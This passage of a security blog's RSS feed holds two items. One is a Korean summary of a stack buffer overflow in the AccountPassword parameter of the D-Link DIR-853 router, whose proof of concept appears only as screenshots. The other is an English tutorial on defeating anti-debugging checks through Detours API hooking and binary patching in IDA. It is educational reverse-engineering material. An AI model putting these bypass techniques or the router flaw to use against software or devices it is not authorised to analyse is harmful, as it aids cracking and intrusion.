      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/certification/">certification</category>
      
      <category domain="https://hackyboiz.github.io/tags/privacy/">privacy</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/27/romi0x/security_authentication_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-25742: D-Link DIR-853에서 발생하는 Stack-based Buffer Overflow로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/</link>
      <guid>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/</guid>
      <pubDate>Wed, 26 Mar 2025 06:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://dear-sunshine-ba5.notion.site/D-Link-DIR-85</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://dear-sunshine-ba5.notion.site/D-Link-DIR-853-4-1812386a664480feaf1ceab444b132b3">https://dear-sunshine-ba5.notion.site/D-Link-DIR-853-4-1812386a664480feaf1ceab444b132b3</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Rev. A1 1.20b07 &#xC774;&#xD558; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>D-Link DIR-853 A1 FW1.20B07 &#xC7A5;&#xBE44;&#xB294; &#xBC29;&#xD654;&#xBCBD;&#xC774; &#xB0B4;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xB77C;&#xC6B0;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC7A5;&#xBE44;&#xC5D0;&#xC11C; stack-based buffer overflow&#xB85C; &#xC778;&#xD55C; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>prog.cgi</code> &#xB0B4;&#xBD80; <code>SetSysEmailSettings</code> &#xBAA8;&#xB4C8; &#xB0B4; <code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image1.png" alt><br>HTTP &#xC694;&#xCCAD; &#xD544;&#xB4DC; <code>AccountPassword</code>&#xB294; <code>decrypt_aes()</code>&#xC5D0; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xC774; &#xB418;&#xACE0;, <code>sub_4270F4()</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC; &#xB429;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image2.png" alt><br>&#xD574;&#xB2F9; &#xC778;&#xC790; <code>a2</code>&#xB97C; <code>v6</code>&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xB8E8;&#xD504;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D0; &#xAE38;&#xC774; &#xC81C;&#xD55C; &#xBC0F; &#xAC80;&#xC99D;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image3.png" alt></p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>System Log &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; Password &#xAC12;&#xC744; &#xC785;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image4.png" alt></p><p>&#xD574;&#xB2F9; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>decrypt_aes()</code> &#xAD6C;&#xBB38;&#xC744; &#xD1B5;&#xD574; <code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC774; &#xC778;&#xCF54;&#xB529; &#xB418;&#xC5B4; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image5.png" alt></p><p><code>AccountPassword</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC744; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC804;&#xC1A1;&#xD558;&#xBA74;, <code>PC</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC774; &#xBCC0;&#xC870; &#xB418;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image6.png" alt><br><img src="/2025/03/26/newp1ayer48/CVE-2025-25742/image7.png" alt></p><p>&#xD604;&#xC7AC; &#xD574;&#xB2F9; &#xC81C;&#xD488;&#xC740; EOL/EOS &#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC7A5;&#xBE44;&#xB97C; &#xAD50;&#xCCB4;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5; &#xB4DC;&#xB9BD;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57959">https://nvd.nist.gov/vuln/detail/CVE-2024-57959</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/D-Link/">D-Link</category>
      
      <category domain="https://hackyboiz.github.io/tags/DIR-853/">DIR-853</category>
      
      <category domain="https://hackyboiz.github.io/tags/Stack-based-Buffer-Overflow/">Stack-based Buffer Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/Out-of-bounds-Write/">Out-of-bounds Write</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/26/newp1ayer48/CVE-2025-25742/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 2(EN)</title>
      <link>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/</guid>
      <pubDate>Sun, 23 Mar 2025 15:45:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is OUYA77. &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;Last time, we explored:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Debugging&lt;/strong&gt;: The process of identifying probl</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is OUYA77. &#x1F642;</p><p>Last time, we explored:</p><ul><li><strong>Debugging</strong>: The process of identifying problematic areas in code, narrowing down the scope, analyzing the cause, and resolving issues.</li><li><strong>Anti-debugging</strong>: Techniques used to detect or disrupt debuggers to protect software from reverse engineering and analysis.</li></ul><p>If you haven&#x2019;t checked it out yet, here&#x2019;s the link! &#x1F447; &#x1F606;</p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/en/"><em>Previous Part: Anti-Debugging Part 1 (EN)</em></a></p><p>In our discussion on anti-debugging techniques, we covered two main categories: <strong>Static</strong> and <strong>Dynamic</strong> methods. <strong>Static</strong> anti-debugging techniques rely on system information or APIs to check if a debugger is attached. For example, in Windows, the <code>IsDebuggerPresent()</code> function can be used to detect a debugger. <strong>Dynamic</strong> techniques, on the other hand, detect debugging through behavioral patterns during program execution, such as timing-based anti-debugging.</p><h2 id="Bypassing-Anti-Debugging-Techniques"><a href="#Bypassing-Anti-Debugging-Techniques" class="headerlink" title="Bypassing Anti-Debugging Techniques"></a>Bypassing Anti-Debugging Techniques</h2><h3 id="Bypassing-Static-Anti-Debugging"><a href="#Bypassing-Static-Anti-Debugging" class="headerlink" title="Bypassing Static Anti-Debugging"></a>Bypassing Static Anti-Debugging</h3><p>Static techniques are relatively simple to implement but can also be bypassed with ease. Here are some common methods to circumvent them:</p><ol><li><strong>API Hooking</strong>: By hooking API functions used for debugger detection, we can intercept and modify their behavior. For instance, in Windows, hooking <code>IsDebuggerPresent()</code> to always return false can effectively hide the debugger.</li><li><strong>Manipulating the PEB Structure</strong>: The <code>BeingDebugged</code> flag in the Process Environment Block (PEB) can be directly modified to conceal the presence of a debugger.</li></ol><h3 id="Bypassing-Dynamic-Anti-Debugging"><a href="#Bypassing-Dynamic-Anti-Debugging" class="headerlink" title="Bypassing Dynamic Anti-Debugging"></a>Bypassing Dynamic Anti-Debugging</h3><p>Dynamic techniques rely on runtime environmental changes and conditions, so bypassing them requires a deep understanding of the program&#x2019;s execution flow. Here are some common bypassing methods:</p><ol><li><strong>Timing-based Evasion</strong>: Timing-based anti-debugging detects debuggers by measuring execution speed. To bypass this, tools like IDA can be used to patch the code and modify timing checks.</li><li><strong>Exception Handling Manipulation</strong>: Some dynamic techniques detect debuggers by triggering and monitoring exceptions. To evade this, exception-handling routines can be altered to prevent debugger detection.</li></ol><h1 id="Hands-on-Practice"><a href="#Hands-on-Practice" class="headerlink" title="Hands-on Practice"></a>Hands-on Practice</h1><p>Now, let&#x2019;s dive into a hands-on exercise.</p><p><strong>Environment Setup</strong></p><ul><li>OS: Windows 11</li><li>Binary Architecture: 32-bit</li><li>Debugging Tool: IDA Freeware 8.4</li><li>IDE: Visual Studio 2022</li></ul><p>In this setup, we will build a 32-bit binary and use IDA Freeware to debug a binary with anti-debugging techniques applied.</p><h2 id="Static-Anti-Debugging-Bypass-Practice"><a href="#Static-Anti-Debugging-Bypass-Practice" class="headerlink" title="Static Anti-Debugging Bypass Practice"></a>Static Anti-Debugging Bypass Practice</h2><h3 id="1-Basic-Program"><a href="#1-Basic-Program" class="headerlink" title="1. Basic Program"></a>1. Basic Program</h3><p>As demonstrated in &#x201C;Part 1,&#x201D; let&#x2019;s create a simple program with anti-debugging measures.</p><p>Open Visual Studio 2022, create an empty project, add a <code>main.cpp</code> file, and build it as an x86 binary.</p><p><img src="image.png" alt="image.png"></p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>After building the executable, navigate to the <code>./Debug</code> folder and run the compiled binary. You should see the message: <code>No debugger found.</code> </p><p><img src="image%201.png" alt="image.png"></p><p>Now, let&#x2019;s try debugging this program using IDA Freeware. Load the binary into IDA, press <strong>F9</strong> to start debugging, and&#x2026;!!</p><p><img src="image%202.png" alt="image.png"></p><p>As seen above, the program detects the debugger using the <code>IsDebuggerPresent()</code> function and displays a detection message.</p><p>This binary employs <code>IsDebuggerPresent()</code> to check for a debugger. But what if this function is disabled or modified? Let&#x2019;s bypass <strong>Static Anti-Debugging</strong> using <strong>API Hooking</strong>.</p><h3 id="2-API-Hooking-Practice-Bypassing-Static-Anti-Debugging"><a href="#2-API-Hooking-Practice-Bypassing-Static-Anti-Debugging" class="headerlink" title="2. API Hooking Practice (Bypassing Static Anti-Debugging)"></a><strong>2. API Hooking Practice (Bypassing Static Anti-Debugging)</strong></h3><p>We will use the <strong>Microsoft Detours</strong> library to perform API Hooking. This library allows us to intercept API calls and modify their behavior to prevent debugger detection.</p><ol><li>Download the compressed file from <a href="https://github.com/microsoft/detours">Microsoft Detours git</a>, extract it to a preferred folder.</li></ol><p><img src="image%203.png" alt="image.png"></p><ol><li><p>Open <strong>Visual Studio 2022</strong> and launch the terminal.</p><p> <img src="image%204.png" alt="image.png"></p></li><li><p>Run <code>nmake</code> to build the source code. This will generate the <code>bin</code>, <code>include</code>, and <code>lib</code> directories.</p><p> <img src="image%205.png" alt="image.png"></p><p> <img src="image%206.png" alt="image.png"></p></li><li><p>In <strong>Visual Studio</strong>, go to <strong>Project &gt; Properties</strong>, set <strong>Configuration</strong> to <strong>All Configurations</strong>, and <strong>Platform</strong> to <strong>Win32</strong>.</p><p> <img src="image%207.png" alt="image.png"></p></li><li><p>Add the <strong>Detours</strong> library to Visual Studio.</p><ul><li><p><strong>C/C++ Properties: Adding Include Directory</strong></p><ol><li>Open <strong>Project Properties</strong> and select <strong>C/C++</strong>.</li><li>Navigate to <strong>General &gt; Additional Include Directories</strong>.</li><li><p>Add the installation path for Detours:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\include</code></p></li><li><p>Click <strong>OK</strong> to save changes.</p></li></ol></li><li><p><strong>Linker Properties: Adding Library Directory</strong></p><ol><li>In <strong>Project Properties</strong>, go to <strong>Linker</strong>.</li><li>Navigate to <strong>General &gt; Additional Library Directories</strong>.</li><li><p>Add the installation path for Detours:</p><p> <code>C:\Users\OUYA77\Desktop\Detours-main\lib</code></p></li><li><p>Click <strong>OK</strong> to save changes.</p></li></ol></li></ul></li></ol><p>If your environment is ready, create <strong>dllmain.cpp</strong> to begin API Hooking! &#x1F680;</p><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;detours.lib&quot;</span>)</span></code></pre><p>Now, actually bypass Static Anti-Debugging by hooking the <strong><code>IsDebuggerPresent()</code></strong> function using Detours.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><span class="hljs-comment">// Function to hook IsDebuggerPresent()</span><span class="hljs-function">BOOL WINAPI <span class="hljs-title">HookedIsDebuggerPresent</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">return</span> FALSE; <span class="hljs-comment">// Always return that no debugger is present</span>}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-comment">// Hook IsDebuggerPresent()</span>    HMODULE hKernel32 = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);    <span class="hljs-keyword">if</span> (hKernel32) {        FARPROC pIsDebuggerPresent = GetProcAddress(hKernel32, <span class="hljs-string">&quot;IsDebuggerPresent&quot;</span>);        <span class="hljs-keyword">if</span> (pIsDebuggerPresent) {            <span class="hljs-comment">// Hooking using the Detours library</span>            DetourTransactionBegin();            DetourUpdateThread(GetCurrentThread());            DetourAttach(&amp;(PVOID&amp;)pIsDebuggerPresent, HookedIsDebuggerPresent);            DetourTransactionCommit();        }    }    <span class="hljs-comment">// Test</span>    <span class="hljs-keyword">if</span> (IsDebuggerPresent()) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No debugger found.\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Build the above source code and conduct the same test as before.</p><p><img src="image%208.png" alt="image.png"></p><p>Naturally, when executed locally without a debugger attached, it prints <code>No debugger found.</code> Now, what happens if we attach a debugger to the binary using IDA?</p><p><img src="image%209.png" alt="image.png"></p><p>OUYA&#x2026;(It is interjection, means Oh wow&#x2026;, Oh my God..) Even while debugging in IDA, it still executes as if no debugger is present.</p><p><img src="1b18ed6b-05c4-4b20-a412-522bd1c12bb3.png" alt="image.png"></p><p>This demonstrates how easily Static Anti-Debugging can be bypassed through API hooking.</p><p>Since Static Anti-Debugging techniques rely on various system information, they can be bypassed by:</p><ul><li><strong>Hooking functions</strong> commonly used for anti-debugging, such as <code>NtQueryInformationProcess()</code></li><li><strong>Directly modifying</strong> anti-debugging-related information in memory, such as the PEB&#x2019;s <code>BeingDebugged</code> flag<ul><li>These friends are typically manipulated by anti-debugging functions.</li></ul></li></ul><p>So, how can we bypass <strong>Dynamic Anti-Debugging</strong>, which exploits the debugger&#x2019;s mechanics? Unlike Static Anti-Debugging, which only needs to be bypassed once, Dynamic Anti-Debugging is applied continuously during execution, requiring either repeated bypassing or a more fundamental approach.</p><p>Let&#x2019;s explore bypassing <strong>Dynamic Anti-Debugging</strong> techniques and observe the differences!</p><h2 id="Dynamic-Anti-Debugging-Bypass-Practice"><a href="#Dynamic-Anti-Debugging-Bypass-Practice" class="headerlink" title="Dynamic Anti-Debugging Bypass Practice"></a>Dynamic Anti-Debugging Bypass Practice</h2><h3 id="1-Regular-Program"><a href="#1-Regular-Program" class="headerlink" title="1. Regular Program"></a>1. Regular Program</h3><p>For the Dynamic Anti-Debugging practice, we&#x2019;ll use <strong>timing-based anti-debugging</strong> techniques introduced in &#x201C;Part 1.&#x201D; Please build the following code as an x86 binary.</p><pre><code class="hljs c"><span class="hljs-comment">// main.cpp</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><span class="hljs-comment">// Key decryption function</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">decryptKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++) {        key[i] = key[i] - <span class="hljs-number">1</span>; <span class="hljs-comment">// Simple Caesar cipher</span>    }}<span class="hljs-comment">// Function to process important data</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processImportantData</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* key)</span> </span>{    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing important data with key: %s\n&quot;</span>, key);    <span class="hljs-comment">// Print a simple message</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Important data processed successfully!\n&quot;</span>);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{    <span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;nztfdsfulfz&quot;</span>;    <span class="hljs-comment">// [1] Timing-based anti-debugging: Measure execution time and detect if an abnormal delay occurs, indicating a debugger is attached.</span>    <span class="hljs-keyword">uint64_t</span> start_time = GetTickCount64();    decryptKey(key);    <span class="hljs-keyword">uint64_t</span> end_time = GetTickCount64();    <span class="hljs-keyword">uint64_t</span> elapsed_time = end_time - start_time;    <span class="hljs-comment">// [2] If execution takes longer than 1 second, assume a debugger is attached.</span>    <span class="hljs-keyword">if</span> (elapsed_time &gt; <span class="hljs-number">1000</span>) {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Debugger detected!\n&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// Exit the program</span>    }    <span class="hljs-comment">// [3] Execute critical logic using the decrypted key: Compare with the correct key to determine valid execution.</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(key, <span class="hljs-string">&quot;mysecretkey&quot;</span>) == <span class="hljs-number">0</span>) {        processImportantData(key);    }    <span class="hljs-keyword">else</span> {        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid key!\n&quot;</span>);    }    system(<span class="hljs-string">&quot;pause&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>This code implements timing-based anti-debugging to protect the critical decryption logic ([1]). If an attacker attempts to analyze the key decryption process, the execution time difference will trigger ([2]), causing the program to terminate. Conversely, under normal execution conditions ([3]), the logic proceeds without issue.</p><p>Now, let&#x2019;s build and run the program!</p><p><img src="image%2010.png" alt="image.png"></p><p>It runs correctly. In this simple example, it just prints <code>Important data processed successfully!</code>, but you can imagine a scenario where a critical operation using the key takes place.</p><p>Since we have verified normal execution, let&#x2019;s attempt debugging this program using IDA.</p><p><img src="image%2011.png" alt="image.png"></p><p>Given that we are particularly interested in the key decryption logic, set a breakpoint (shortcut: F2) on the decryption function and start debugging (F9). By stepping into (F7) the function and analyzing how the key is decrypted, we can then continue execution. However, as shown below, the program detects debugging activity and terminates.</p><p><img src="2f9db531-4021-4c69-9805-b40c8cb60ee0.png" alt="image.png"></p><p>Even though this is a simple example, if the key changed on every execution, even if extracted via debugging, the anti-debugging mechanism would cause the program to terminate, making it impossible to use the extracted key. The effectiveness of anti-debugging depends on the skill level of the attacker; by applying more advanced techniques, the difficulty of analysis can be significantly increased.</p><h3 id="2-Binary-Patching-Bypassing-Dynamic-Anti-Debugging"><a href="#2-Binary-Patching-Bypassing-Dynamic-Anti-Debugging" class="headerlink" title="2. Binary Patching (Bypassing Dynamic Anti-Debugging)"></a>2. Binary Patching (Bypassing Dynamic Anti-Debugging)</h3><p>How can we modify the program&#x2019;s flow to bypass the anti-debugging check?</p><p>We can consider two main approaches:</p><blockquote><p>&#x2460; Neutralizing the timing check</p><ol><li>Locate the <code>GetTickCount64()</code> function calls and modify them.<ul><li>Patch them with NOP instructions or replace them with a function that always returns a constant value.</li></ul></li><li>Modify <code>if (elapsed_time &gt; 1000)</code> to an impossible condition, like <code>if (elapsed_time &lt; 0)</code>.<ul><li>Alternatively, modify a <code>jmp</code> instruction to always proceed normally.</li></ul></li></ol><p><strong>&#x2461; Preventing program termination</strong></p><ul><li>Locate <code>printf(&quot;Debugger detected!\n&quot;); return 1;</code> and patch <code>return 1;</code> with <strong>NOP (0x90)</strong>.</li></ul></blockquote><p>Since compiler optimizations may alter the actual implementation, let&#x2019;s examine the binary in IDA.</p><p><img src="image%2012.png" alt="image.png"></p><p>I will patch the instruction at line 16. Normally, CF and ZF flags must be 0 for <code>elapsed_time</code> to be less than 1 second, but I will modify <code>jbe</code> to <code>ja</code> so that the key validation logic only executes when execution takes more than 1 second. By selecting line 16 and examining the assembly, we can see two jump instructions. I will patch the first one with NOP and modify the second one at runtime.</p><p><img src="image%2013.png" alt="image.png"></p><p>Now, let&#x2019;s set a breakpoint on the key decryption function and ensure debugging lasts longer than 1 second before proceeding.</p><p>When we press F9 to start debugging:</p><p><img src="image%2014.png" alt="image.png"></p><p>We hit the first breakpoint, allowing us to analyze <code>decryptKey</code>. After analyzing, we continue execution until the second breakpoint.</p><p><img src="image%2015.png" alt="image.png"></p><p>At the second breakpoint, we modify <code>jbe</code> to <code>ja</code> using &#x201C;Edit &gt; Patch Program &gt; Assemble,&#x201D; successfully bypassing the anti-debugging check. LOL</p><p><img src="image%2016.png" alt="image.png"></p><p>In similar situations, other bypass techniques include modifying <code>CF</code> and <code>ZF</code> flags at runtime or hooking <code>GetTickCount()</code> to return a constant value, effectively neutralizing the anti-debugging logic.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p><img src="Debug_part2.jpg" alt="Debug_part2.jpg"></p><p>The techniques we practiced today are classic examples of bypassing anti-debugging. These techniques are used as &#x201C;trap card&#x201D; to bypass security solutions when they try to block specific actions.</p><blockquote><p>Blocking debuggers with Anti-Debugging techniques, bypassing those with Anti-Debugging bypass, <del>countering that with Anti-Anti-Anti-Debugging, and stopping that with Anti-Anti-Anti-Anti tititi Fragile Fragile!</del></p><p><img src="Anti-Fragile.gif" alt="K-POP Group LE SSERAFIM"></p><p>K-POP Group LE SSERAFIM</p></blockquote><h2 id="Limitations-of-Anti-Debugging"><a href="#Limitations-of-Anti-Debugging" class="headerlink" title="Limitations of Anti-Debugging"></a>Limitations of Anti-Debugging</h2><p>Anti-debugging is a core technique that makes code analysis difficult and hinders reverse engineering and vulnerability analysis. It can prevent unauthorized copying, cracking, and misuse of software, especially in areas handling sensitive data like finance, gaming, and security products. (Often featured in CTF challenges!) With its flexibility to be adapted to various environments, it has high effectiveness in detecting and responding when an attacker tries to debug.</p><p>However, as we saw in the practice session today, it is vulnerable to code patching and API hooking. This is because once you know the area, it becomes patchable.</p><p><img src="image%2017.png" alt="image.png"></p><blockquote><p>???: So why not just hide it? / 000: How!!</p></blockquote><p><img src="9o6emu.gif" alt="9o6emu.gif"></p><p>By obfuscating the anti-debugging logic, it becomes impossible to understand the technique used. If you cannot identify the anti-debugging method, it becomes much harder to figure out how to bypass it. This combination of static obfuscation techniques and dynamic anti-debugging creates a program that is extremely difficult and complex to analyze. (Maybe I&#x2019;ll cover obfuscation in a future blog post!)</p><h2 id="Significance"><a href="#Significance" class="headerlink" title="Significance"></a>Significance</h2><p>From a malware analysis perspective, reversing and anti-reversing are like an eternal battle between sword and shield. Malware analysts use reversing techniques to uncover how malicious code operates, while malware developers employ anti-reversing techniques to obstruct analysis and keep their code&#x2019;s secrets hidden.</p><p>Even from the standpoint of ethical software developers, reversing and anti-reversing hold significant meaning. Reversing can be used to identify software vulnerabilities and strengthen security, whereas anti-reversing helps protect intellectual property and prevent unauthorized copying.</p><p>Ultimately, reversing and anti-reversing, debugging and anti-debugging, continuously evolve in response to each other, fueling an ongoing battle. In this sense, it feels much like the never-ending struggle between heroes and villains in movies&#x2014;an endless tug-of-war between malware developers and analysts, software developers and attackers. However, the real issue is not the technology itself, but the ethical responsibility of those who wield it. Perhaps our true mission is to use these technologies wisely to build a safer and more trustworthy digital world. How do you think?</p><p><img src="image%2018.jpg" alt="image.png"></p><p>Thank you for reading the long post. I&#x2019;ll return with better research articles &#x1F642;</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>&#xB9AC;&#xBC84;&#xC2F1; &#xD575;&#xC2EC; &#xC6D0;&#xB9AC;: &#xC545;&#xC131; &#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xAC00;&#xC758; &#xB9AC;&#xBC84;&#xC2F1; &#xC774;&#xC57C;&#xAE30;(&#xC800;&#xC790; &#xC774;&#xC2B9;&#xC6D0;)</p><p>Detoures - <a href="https://secmem.tistory.com/480">https://secmem.tistory.com/480</a></p><p><a href="https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software">https://www.apriorit.com/dev-blog/367-anti-reverse-engineering-protection-techniques-to-use-before-releasing-software</a></p><p><a href="https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis">https://www.bitdefender.com/en-us/blog/businessinsights/the-differences-between-static-malware-analysis-and-dynamic-malware-analysis</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/Debugging/">Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Anti-Debugging/">Anti-Debugging</category>
      
      <category domain="https://hackyboiz.github.io/tags/Malware/">Malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Reverse-Engineering/">Reverse Engineering</category>
      
      
      <comments>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 2(KR)</title>
      <link>https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/kr/</link>
